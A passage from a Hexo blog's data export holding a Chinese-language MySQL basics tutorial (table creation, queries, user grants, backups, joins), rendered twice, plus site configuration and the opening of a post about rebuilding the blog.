class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"DQL\"><a href=\"#DQL\" class=\"headerlink\" title=\"DQL\"></a>DQL</h3><pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">语法：\nSELECT selection_list /*要查询的列名称*/\n  FROM table_list /*要查询的表名称*/\n  WHERE condition /*行条件*/\n  GROUP BY grouping_columns /*对结果分组*/\n  HAVING condition /*分组后的行条件*/\n  ORDER BY sorting_columns /*对结果分组*/\n  LIMIT offset_start, row_count /*结果限定*/\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h5 id=\"条件查询\"><a href=\"#条件查询\" class=\"headerlink\" title=\"条件查询\"></a>条件查询</h5><ul>\n<li>=、!=、&lt;&gt;、&lt;、&lt;=、&gt;、&gt;=；</li>\n<li>BETWEEN…AND；</li>\n<li>IN(set)；</li>\n<li>IS NULL；</li>\n<li>AND；</li>\n<li>OR；</li>\n<li>NOT；</li>\n</ul>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">SELECT * FROM stu \nWHERE sid IN ('S_1001','S_1002','S_1003');\nSELECT * FROM stu\nWHERE sname IS NOT NULL;\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<h5 id=\"模糊查询\"><a href=\"#模糊查询\" class=\"headerlink\" title=\"模糊查询\"></a>模糊查询</h5><ul>\n<li>“<em>_”:匹配任意一个字母，5个“</em>”表示5个任意字母 </li>\n<li>“%”:匹配0~n个任何字母 “</li>\n</ul>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\"># 查询姓名中第2个字母为“i”的学生记录\nSELECT * FROM stu\nWHERE sname LIKE '_i%';<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<h5 id=\"字段控制查询\"><a href=\"#字段控制查询\" class=\"headerlink\" title=\"字段控制查询\"></a>字段控制查询</h5><ul>\n<li><p>去除重复记录 :distinct</p>\n<p><code>SELECT DISTINCT sal FROM emp;</code></p>\n</li>\n<li><p>给列名添加别名 </p>\n<p><code>SELECT *, sal+IFNULL(comm,0) AS total FROM emp;</code></p>\n</li>\n</ul>\n<h5 id=\"排序\"><a href=\"#排序\" class=\"headerlink\" title=\"排序\"></a>排序</h5><pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">SELECT * FROM emp\nORDER BY sal DESC,empno ASC;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<h5 id=\"聚合函数\"><a href=\"#聚合函数\" class=\"headerlink\" title=\"聚合函数\"></a>聚合函数</h5><ul>\n<li>COUNT()：统计指定列不为NULL的记录行数；</li>\n<li>MAX()：计算指定列的最大值，是字符串类型，那么使用字符串排序运算；</li>\n<li>MIN()：计算指定列的最小值，是字符串类型，那么使用字符串排序运算；</li>\n<li>SUM()：计算指定列的数值和，不是数值类型，计算结果为0；</li>\n<li>AVG()：计算指定列的平均值，不是数值类型，那么计算结果为0；</li>\n</ul>\n<h5 id=\"分组-GROUP-BY-查询\"><a href=\"#分组-GROUP-BY-查询\" class=\"headerlink\" title=\"分组(GROUP BY)查询\"></a>分组(GROUP BY)查询</h5><pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">SELECT deptno,COUNT(*)\nFROM emp\nWHERE sal>1500\nGROUP BY deptno;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<h5 id=\"HAVING子句\"><a href=\"#HAVING子句\" class=\"headerlink\" title=\"HAVING子句\"></a>HAVING子句</h5><pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">SELECT deptno, SUM(sal) FROM emp\nGROUP BY deptno\nHAVING SUM(sal) > 9000;\n#注：WHERE是对分组前记录的条件，如果某行记录没有满足WHERE子句的条件，那么这行记录不会参加分组；而HAVING是对分组后数据的约束<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<h5 id=\"LIMIT\"><a href=\"#LIMIT\" class=\"headerlink\" title=\"LIMIT\"></a>LIMIT</h5><blockquote>\n<p>limit 起始行 , 查询行数 //起始行从0开始，为开区间</p>\n</blockquote>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\"># 查询从第四行开始的10行记录\nSELECT * FROM emp LIMIT 3, 10;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<h3 id=\"完整性约束\"><a href=\"#完整性约束\" class=\"headerlink\" title=\"完整性约束\"></a>完整性约束</h3><ol>\n<li><p>主键 ：primary key</p>\n<ul>\n<li><p>创建表：定义列时指定主键</p>\n</li>\n<li><p>创建表：定义列之后独立指定主键</p>\n</li>\n<li><p>修改表时指定主键</p>\n<p><code>ALTER TABLE stu ADD PRIMARY KEY(sid);</code></p>\n</li>\n<li><p>删除主键 </p>\n<p><code>ALTER TABLE stu DROP PRIMARY KEY;</code></p>\n</li>\n</ul>\n</li>\n<li><p>主键自增长 ：auto_increment（主键必须是整型才可以自增长） </p>\n<ul>\n<li><p>创建表时设置主键自增长</p>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">CREATE TABLE stu(\n    sid INT PRIMARY KEY AUTO_INCREMENT,\n    sname   VARCHAR(20),\n    age     INT,\n    gender  VARCHAR(10)\n);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>修改表时设置主键自增长 </p>\n<p><code>ALTER TABLE stu CHANGE sid sid INT AUTO_INCREMENT;</code></p>\n</li>\n<li><p>修改表时删除主键自增长</p>\n<p><code>ALTER TABLE stu CHANGE sid sid INT;</code></p>\n</li>\n</ul>\n</li>\n<li><p>非空：NOT NULL</p>\n<blockquote>\n<p>字段设为非空后，插入记录时必须给值</p>\n</blockquote>\n</li>\n<li><p>唯一：UNIQUE</p>\n<blockquote>\n<p>字段指定唯一约束后，字段的值必须是唯一的 </p>\n</blockquote>\n</li>\n<li><p>外键</p>\n<blockquote>\n<p>外键是另一张表的主键 ！！</p>\n<p>外键就是用来约束这一列的值必须是另一张表的主键值！!</p>\n</blockquote>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\"># 创建表时设置外键\n\nCREATE TABLE t_section(\n    sid INT PRIMARY KEY AUTO_INCREMENT,\n    sname   VARCHAR(30),\n    u_id    INT,\n    CONSTRAINT fk_t_user FOREIGN KEY(u_id) REFERENCES t_user(uid)\n);\n\n# 修改表时设置外键\n\nALTER TABLE t_session\nADD CONSTRAINT fk_t_user\nFOREIGN KEY(u_id)\nREFERENCES t_user(uid);\n\n# 修改表时删除外键\n\nALTER TABLE t_section\nDROP FOREIGN KEY fk_t_user;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n</ol>\n<h3 id=\"MySQL数据库备份与还原\"><a href=\"#MySQL数据库备份与还原\" class=\"headerlink\" title=\"MySQL数据库备份与还原\"></a>MySQL数据库备份与还原</h3><ol>\n<li><p>生成SQL脚本 (备份)</p>\n<blockquote>\n<p>脚本文本中只包含数据库的内容，而不会存在创建数据库的语句!</p>\n<p>在未登录mysql状态下：</p>\n<p>mysqldump –u 用户名 –p 密码 数据库名&gt;生成的脚本文件路径<code>mysqldump -uroot -p123456 javaclass&gt;E:\\javaclass.sql</code></p>\n</blockquote>\n</li>\n<li><p>执行SQL脚本 </p>\n<blockquote>\n<p>执行SQL脚本需要登录mysql，进入指定数据库，执行SQL脚本！<code>SOURCE E:\\javaclass.sql</code></p>\n<p>无需登录mysql</p>\n<p>mysql –u用户名 –p密码 数据库&lt;要执行脚本文件路径 :</p>\n<p><code>mysql -uroot -p123456 javaclass&lt;E:\\javaclass.sql</code></p>\n</blockquote>\n</li>\n</ol>\n<h3 id=\"多表查询\"><a href=\"#多表查询\" class=\"headerlink\" title=\"多表查询\"></a>多表查询</h3><ul>\n<li>合并结果集</li>\n<li>连接查询 <ol>\n<li>内连接</li>\n<li>外连接 <ol>\n<li>左外连接</li>\n<li>右外连接</li>\n<li>全外连接（MYSQL不支持）</li>\n</ol>\n</li>\n<li>自然连接</li>\n</ol>\n</li>\n<li>子查询</li>\n</ul>\n<hr>\n<p><strong>合并结果集</strong></p>\n<ul>\n<li>UNION：去除重复记录 <code>SELECT * FROM t1 UNION SELECT * FROM t2；</code> </li>\n<li>UNION ALL:不去除重复记录<code>SELECT * FROM t1 UNION ALL SELECT * FROM t2;</code></li>\n</ul>\n<p><strong>连接查询</strong></p>\n<p><em>内连接</em>：</p>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\"># 方言版\nSELECT e.ename,e.sal,e.comm,d.dname \nFROM emp AS e,dept AS d\nWHERE e.deptno=d.deptno;\n# 标准版\nSELECT * \nFROM emp e \nINNER JOIN dept d \nON e.deptno=d.deptno;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><em>左连接</em>：</p>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">SELECT * FROM emp e \nLEFT OUTER JOIN dept d \nON e.deptno=d.deptno;123<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p><em>右连接</em>:</p>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">SELECT * FROM emp e \nRIGHT OUTER JOIN dept d \nON e.deptno=d.deptno;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p><em>自然连接</em>:</p>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">SELECT * FROM emp NATURAL JOIN dept;\nSELECT * FROM emp NATURAL LEFT JOIN dept;\nSELECT * FROM emp NATURAL RIGHT JOIN dept;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p><strong>子查询</strong></p>\n<blockquote>\n<p>嵌套查询，即SELECT中包含SELECT，如果一条语句中存在两个，或两个以上SELECT，那么就是子查询语句了。 </p>\n<p>子查询出现的位置：</p>\n<ul>\n<li>where后，作为条件的一部分 </li>\n<li>from后，作为被查询的一条表</li>\n</ul>\n</blockquote>\n<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":"<h2 id=\"MySQL常用基础语法\"><a href=\"#MySQL常用基础语法\" class=\"headerlink\" title=\"MySQL常用基础语法\"></a>MySQL常用基础语法</h2><p>Younger_zeng 2018-08-02 17:20:23  <a href=\"https://blog.csdn.net/qq_36969257/article/details/81364113\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/qq_36969257/article/details/81364113</a></p>\n<h1 id=\"MySQL语法\"><a href=\"#MySQL语法\" class=\"headerlink\" title=\"MySQL语法\"></a>MySQL语法</h1><p>[TOC]</p>\n<pre><code>MySQL语法\n        启动和关闭\n        分类：\n        数据类型\n        DDL\n        DML\n        DCL\n        DQL\n                条件查询\n                模糊查询\n                字段控制查询\n                排序\n                聚合函数\n                分组(GROUP BY)查询\n                HAVING子句\n                LIMIT\n        完整性约束\n        MySQL数据库备份与还原\n        多表查询</code></pre><h3 id=\"启动和关闭\"><a href=\"#启动和关闭\" class=\"headerlink\" title=\"启动和关闭\"></a>启动和关闭</h3><pre><code class=\"mysql\">启动：net start mysql;\n关闭：net stop mysql;\n登录：mysql -u root -p 123 -h localhost；\n退出：quit;1234</code></pre>\n<h3 id=\"分类：\"><a href=\"#分类：\" class=\"headerlink\" title=\"分类：\"></a>分类：</h3><ul>\n<li>DDL（Data Definition Language）：数据定义语言，用来定义数据库对象：库、表、列等； </li>\n<li>DML（Data Manipulation Language）:数据操作语言，用来定义数据库记录（数据）；</li>\n<li>DCL（Data Control Language）：数据控制语言，用来定义访问权限和安全级别；</li>\n<li>DQL（Data Query Language）：数据查询语言，用来查询记录（数据）。</li>\n</ul>\n<h3 id=\"数据类型\"><a href=\"#数据类型\" class=\"headerlink\" title=\"数据类型\"></a>数据类型</h3><h3 id=\"DDL\"><a href=\"#DDL\" class=\"headerlink\" title=\"DDL\"></a>DDL</h3><pre><code class=\"mysql\">查看所有数据库名称：SHOW DATABASES；\n切换数据库：USE mydb1;\n创建数据库：CREATE DATABASE [IF NOT EXISTS] mydb1；\n删除数据库：DROP DATABASE [IF EXISTS] mydb1；\n修改数据库编码：ALTER DATABASE mydb1 CHARACTER SET utf812345\n# 创建表\nCREATE TABLE stu(\n    sid     CHAR(6),\n    sname   VARCHAR(20),\n    age     INT,\n    gender  VARCHAR(10) \n);\n\nCREATE TABLE emp(\n    eid     CHAR(6),\n    ename   VARCHAR(50),\n    age     INT,\n    gender  VARCHAR(6),\n    birthday    DATE,\n    hiredate    DATE,\n    salary  DECIMAL(7,2),\n    resume  VARCHAR(1000)\n);123456789101112131415161718\n查看当前数据库中所有表名称：SHOW TABLES；\n查看指定表的创建语句：SHOW CREATE TABLE emp;\n查看表结构：DESC emp;\n删除表：DROP TABLE emp;\n修改表：\n# 1.修改之添加列：给stu表添加classname列：\n    ALTER TABLE stu ADD (classname varchar(100));\n# 2.修改之修改列类型：修改stu表的gender列类型为CHAR(2)：\n    ALTER TABLE stu MODIFY gender CHAR(2);\n# 3.修改之修改列名：修改stu表的gender列名为sex：\n    ALTER TABLE stu change gender sex CHAR(2);\n# 4.修改之删除列：删除stu表的classname列：\n    ALTER TABLE stu DROP classname;\n# 5.修改之修改表名称：修改stu表名称为student：\n    ALTER TABLE stu RENAME TO student;\n</code></pre>\n<h3 id=\"DML\"><a href=\"#DML\" class=\"headerlink\" title=\"DML\"></a>DML</h3><pre><code class=\"mysql\"># 插入数据\nINSERT INTO stu(sid, sname) VALUES(&#39;s_1001&#39;, &#39;zhangSan&#39;);\nINSERT INTO stu VALUES(&#39;s_1002&#39;, &#39;liSi&#39;, 32, &#39;female&#39;);\n# 修改数据\nUPDATE stu SET sname=’liSi’, age=’20’ WHERE age&gt;50 AND gender=’male’;\n# 删除数据\nDELETE FROM stu WHERE sname=’chenQi’ OR age &gt; 30;\nDELETE FROM stu; \n# truncate 是先DROP TABLE，再CREATE TABLE。而且TRUNCATE删除的记录是无  法回滚的，但DELETE删除的记录是可以回滚的\nTRUNCATE TABLE stu;</code></pre>\n<h3 id=\"DCL\"><a href=\"#DCL\" class=\"headerlink\" title=\"DCL\"></a>DCL</h3><pre><code class=\"mysql\"># 创建用户: CREATE USER 用户名@地址 IDENTIFIED BY &#39;密码&#39;;\nCREATE USER user1@localhost IDENTIFIED BY ‘123’; \nCREATE USER user2@’%’ IDENTIFIED BY ‘123’; \n# 给用户授权: GRANT 权限1, … , 权限n ON 数据库.* TO 用户名\nGRANT CREATE,ALTER,DROP,INSERT,UPDATE,DELETE,SELECT ON mydb1.* TO user1@localhost;\nGRANT ALL ON mydb1.* TO user2@localhost;\n# 撤销授权: REVOKE权限1, … , 权限n ON 数据库.* FORM 用户名\nREVOKE CREATE,ALTER,DROP ON mydb1.* FROM user1@localhost;\n# 查看用户权限:SHOW GRANTS FOR 用户名\nSHOW GRANTS FOR user1@localhost;\n# 删除用户:DROP USER 用户名\nDROP USER user1@localhost;\n# 修改用户密码\nUSE mysql;\nUPDATE USER SET PASSWORD=PASSWORD(‘密码’) WHERE User=’用户名’ and Host=’IP’;\nFLUSH PRIVILEGES;\n#------------------\nUPDATE USER SET PASSWORD=PASSWORD(&#39;1234&#39;) WHERE User=&#39;user2&#39; and Host=’localhost’;\nFLUSH PRIVILEGES;\n\n</code></pre>\n<h3 id=\"DQL\"><a href=\"#DQL\" class=\"headerlink\" title=\"DQL\"></a>DQL</h3><pre><code class=\"mysql\">语法：\nSELECT selection_list /*要查询的列名称*/\n  FROM table_list /*要查询的表名称*/\n  WHERE condition /*行条件*/\n  GROUP BY grouping_columns /*对结果分组*/\n  HAVING condition /*分组后的行条件*/\n  ORDER BY sorting_columns /*对结果分组*/\n  LIMIT offset_start, row_count /*结果限定*/\n</code></pre>\n<h5 id=\"条件查询\"><a href=\"#条件查询\" class=\"headerlink\" title=\"条件查询\"></a>条件查询</h5><ul>\n<li>=、!=、&lt;&gt;、&lt;、&lt;=、&gt;、&gt;=；</li>\n<li>BETWEEN…AND；</li>\n<li>IN(set)；</li>\n<li>IS NULL；</li>\n<li>AND；</li>\n<li>OR；</li>\n<li>NOT；</li>\n</ul>\n<pre><code class=\"mysql\">SELECT * FROM stu \nWHERE sid IN (&#39;S_1001&#39;,&#39;S_1002&#39;,&#39;S_1003&#39;);\nSELECT * FROM stu\nWHERE sname IS NOT NULL;\n</code></pre>\n<h5 id=\"模糊查询\"><a href=\"#模糊查询\" class=\"headerlink\" title=\"模糊查询\"></a>模糊查询</h5><ul>\n<li>“<em>_”:匹配任意一个字母，5个“</em>”表示5个任意字母 </li>\n<li>“%”:匹配0~n个任何字母 “</li>\n</ul>\n<pre><code class=\"mysql\"># 查询姓名中第2个字母为“i”的学生记录\nSELECT * FROM stu\nWHERE sname LIKE &#39;_i%&#39;;</code></pre>\n<h5 id=\"字段控制查询\"><a href=\"#字段控制查询\" class=\"headerlink\" title=\"字段控制查询\"></a>字段控制查询</h5><ul>\n<li><p>去除重复记录 :distinct</p>\n<p><code>SELECT DISTINCT sal FROM emp;</code></p>\n</li>\n<li><p>给列名添加别名 </p>\n<p><code>SELECT *, sal+IFNULL(comm,0) AS total FROM emp;</code></p>\n</li>\n</ul>\n<h5 id=\"排序\"><a href=\"#排序\" class=\"headerlink\" title=\"排序\"></a>排序</h5><pre><code class=\"mysql\">SELECT * FROM emp\nORDER BY sal DESC,empno ASC;</code></pre>\n<h5 id=\"聚合函数\"><a href=\"#聚合函数\" class=\"headerlink\" title=\"聚合函数\"></a>聚合函数</h5><ul>\n<li>COUNT()：统计指定列不为NULL的记录行数；</li>\n<li>MAX()：计算指定列的最大值，是字符串类型，那么使用字符串排序运算；</li>\n<li>MIN()：计算指定列的最小值，是字符串类型，那么使用字符串排序运算；</li>\n<li>SUM()：计算指定列的数值和，不是数值类型，计算结果为0；</li>\n<li>AVG()：计算指定列的平均值，不是数值类型，那么计算结果为0；</li>\n</ul>\n<h5 id=\"分组-GROUP-BY-查询\"><a href=\"#分组-GROUP-BY-查询\" class=\"headerlink\" title=\"分组(GROUP BY)查询\"></a>分组(GROUP BY)查询</h5><pre><code class=\"mysql\">SELECT deptno,COUNT(*)\nFROM emp\nWHERE sal&gt;1500\nGROUP BY deptno;</code></pre>\n<h5 id=\"HAVING子句\"><a href=\"#HAVING子句\" class=\"headerlink\" title=\"HAVING子句\"></a>HAVING子句</h5><pre><code class=\"mysql\">SELECT deptno, SUM(sal) FROM emp\nGROUP BY deptno\nHAVING SUM(sal) &gt; 9000;\n#注：WHERE是对分组前记录的条件，如果某行记录没有满足WHERE子句的条件，那么这行记录不会参加分组；而HAVING是对分组后数据的约束</code></pre>\n<h5 id=\"LIMIT\"><a href=\"#LIMIT\" class=\"headerlink\" title=\"LIMIT\"></a>LIMIT</h5><blockquote>\n<p>limit 起始行 , 查询行数 //起始行从0开始，为开区间</p>\n</blockquote>\n<pre><code class=\"mysql\"># 查询从第四行开始的10行记录\nSELECT * FROM emp LIMIT 3, 10;</code></pre>\n<h3 id=\"完整性约束\"><a href=\"#完整性约束\" class=\"headerlink\" title=\"完整性约束\"></a>完整性约束</h3><ol>\n<li><p>主键 ：primary key</p>\n<ul>\n<li><p>创建表：定义列时指定主键</p>\n</li>\n<li><p>创建表：定义列之后独立指定主键</p>\n</li>\n<li><p>修改表时指定主键</p>\n<p><code>ALTER TABLE stu ADD PRIMARY KEY(sid);</code></p>\n</li>\n<li><p>删除主键 </p>\n<p><code>ALTER TABLE stu DROP PRIMARY KEY;</code></p>\n</li>\n</ul>\n</li>\n<li><p>主键自增长 ：auto_increment（主键必须是整型才可以自增长） </p>\n<ul>\n<li><p>创建表时设置主键自增长</p>\n<pre><code class=\"mysql\">CREATE TABLE stu(\n    sid INT PRIMARY KEY AUTO_INCREMENT,\n    sname   VARCHAR(20),\n    age     INT,\n    gender  VARCHAR(10)\n);</code></pre>\n</li>\n<li><p>修改表时设置主键自增长 </p>\n<p><code>ALTER TABLE stu CHANGE sid sid INT AUTO_INCREMENT;</code></p>\n</li>\n<li><p>修改表时删除主键自增长</p>\n<p><code>ALTER TABLE stu CHANGE sid sid INT;</code></p>\n</li>\n</ul>\n</li>\n<li><p>非空：NOT NULL</p>\n<blockquote>\n<p>字段设为非空后，插入记录时必须给值</p>\n</blockquote>\n</li>\n<li><p>唯一：UNIQUE</p>\n<blockquote>\n<p>字段指定唯一约束后，字段的值必须是唯一的 </p>\n</blockquote>\n</li>\n<li><p>外键</p>\n<blockquote>\n<p>外键是另一张表的主键 ！！</p>\n<p>外键就是用来约束这一列的值必须是另一张表的主键值！!</p>\n</blockquote>\n<pre><code class=\"mysql\"># 创建表时设置外键\n\nCREATE TABLE t_section(\n    sid INT PRIMARY KEY AUTO_INCREMENT,\n    sname   VARCHAR(30),\n    u_id    INT,\n    CONSTRAINT fk_t_user FOREIGN KEY(u_id) REFERENCES t_user(uid)\n);\n\n# 修改表时设置外键\n\nALTER TABLE t_session\nADD CONSTRAINT fk_t_user\nFOREIGN KEY(u_id)\nREFERENCES t_user(uid);\n\n# 修改表时删除外键\n\nALTER TABLE t_section\nDROP FOREIGN KEY fk_t_user;</code></pre>\n</li>\n</ol>\n<h3 id=\"MySQL数据库备份与还原\"><a href=\"#MySQL数据库备份与还原\" class=\"headerlink\" title=\"MySQL数据库备份与还原\"></a>MySQL数据库备份与还原</h3><ol>\n<li><p>生成SQL脚本 (备份)</p>\n<blockquote>\n<p>脚本文本中只包含数据库的内容，而不会存在创建数据库的语句!</p>\n<p>在未登录mysql状态下：</p>\n<p>mysqldump –u 用户名 –p 密码 数据库名&gt;生成的脚本文件路径<code>mysqldump -uroot -p123456 javaclass&gt;E:\\javaclass.sql</code></p>\n</blockquote>\n</li>\n<li><p>执行SQL脚本 </p>\n<blockquote>\n<p>执行SQL脚本需要登录mysql，进入指定数据库，执行SQL脚本！<code>SOURCE E:\\javaclass.sql</code></p>\n<p>无需登录mysql</p>\n<p>mysql –u用户名 –p密码 数据库&lt;要执行脚本文件路径 :</p>\n<p><code>mysql -uroot -p123456 javaclass&lt;E:\\javaclass.sql</code></p>\n</blockquote>\n</li>\n</ol>\n<h3 id=\"多表查询\"><a href=\"#多表查询\" class=\"headerlink\" title=\"多表查询\"></a>多表查询</h3><ul>\n<li>合并结果集</li>\n<li>连接查询 <ol>\n<li>内连接</li>\n<li>外连接 <ol>\n<li>左外连接</li>\n<li>右外连接</li>\n<li>全外连接（MYSQL不支持）</li>\n</ol>\n</li>\n<li>自然连接</li>\n</ol>\n</li>\n<li>子查询</li>\n</ul>\n<hr>\n<p><strong>合并结果集</strong></p>\n<ul>\n<li>UNION：去除重复记录 <code>SELECT * FROM t1 UNION SELECT * FROM t2；</code> </li>\n<li>UNION ALL:不去除重复记录<code>SELECT * FROM t1 UNION ALL SELECT * FROM t2;</code></li>\n</ul>\n<p><strong>连接查询</strong></p>\n<p><em>内连接</em>：</p>\n<pre><code class=\"mysql\"># 方言版\nSELECT e.ename,e.sal,e.comm,d.dname \nFROM emp AS e,dept AS d\nWHERE e.deptno=d.deptno;\n# 标准版\nSELECT * \nFROM emp e \nINNER JOIN dept d \nON e.deptno=d.deptno;</code></pre>\n<p><em>左连接</em>：</p>\n<pre><code class=\"mysql\">SELECT * FROM emp e \nLEFT OUTER JOIN dept d \nON e.deptno=d.deptno;123</code></pre>\n<p><em>右连接</em>:</p>\n<pre><code class=\"mysql\">SELECT * FROM emp e \nRIGHT OUTER JOIN dept d \nON e.deptno=d.deptno;</code></pre>\n<p><em>自然连接</em>:</p>\n<pre><code class=\"mysql\">SELECT * FROM emp NATURAL JOIN dept;\nSELECT * FROM emp NATURAL LEFT JOIN dept;\nSELECT * FROM emp NATURAL RIGHT JOIN dept;</code></pre>\n<p><strong>子查询</strong></p>\n<blockquote>\n<p>嵌套查询，即SELECT中包含SELECT，如果一条语句中存在两个，或两个以上SELECT，那么就是子查询语句了。 </p>\n<p>子查询出现的位置：</p>\n<ul>\n<li>where后，作为条件的一部分 </li>\n<li>from后，作为被查询的一条表</li>\n</ul>\n</blockquote>\n"},{"title":"重建博客","date":"2021-02-01T03:41:03.000Z","author":"Liloong3t","img":null,"coverImg":"/medias/banner/2.jpg","top":true,"cover":true,"toc":true,"mathjax":false,"summary":"倒腾了一两天把个人博客网站重建了，目前这个版本使用应该是够了，当然还有一些优化项和功能增加后续慢慢更新玩玩。至于为什么重建博客，这要从一个协会博客开始说起了，不过我也早就看不惯原来那个jkyll模板的博客了，功能过于简陋。这两天解决这些破问题还顺便速成了一下git。","password":null,"_content":"\n\n\n# 简短介绍\n\n倒腾了一两周总算把个人博客网站完善了，目前这个版本使用应该是够了，当然还有一些优化项和功能增加后续在慢慢更新。\n\n本博客基于`Hexo`框架搭建，用到模板基础为[hexo-theme-matery](https://github.com/shw2018/hexo-theme-matery)主题,并在此基础之上做了很多修改的洪卫大佬的[hexo-blog-fly](https://github.com/shw2018/hexo-blog-fly.git)主题，做了一些个性化修改。洪卫大佬博客地址：[https://shw2018.github.io](https://shw2018.github.io/)，博客演示：[sunhwee.com](https://sunhwee.com)。\n\n---\n\n## 特性\n\n**原 matery 主题特性**:\n\n- 简单漂亮，文章内容美观易读\n- [Material Design](https://material.io/) 设计\n- 响应式设计，博客在桌面端、平板、手机等设备上均能很好的展现\n- 首页轮播文章及每天动态切换 `Banner` 图片\n- 瀑布流式的博客文章列表（文章无特色图片时会有 `24` 张漂亮的图片代替）\n- 时间轴式的归档页\n- **词云**的标签页和**雷达图**的分类页\n- 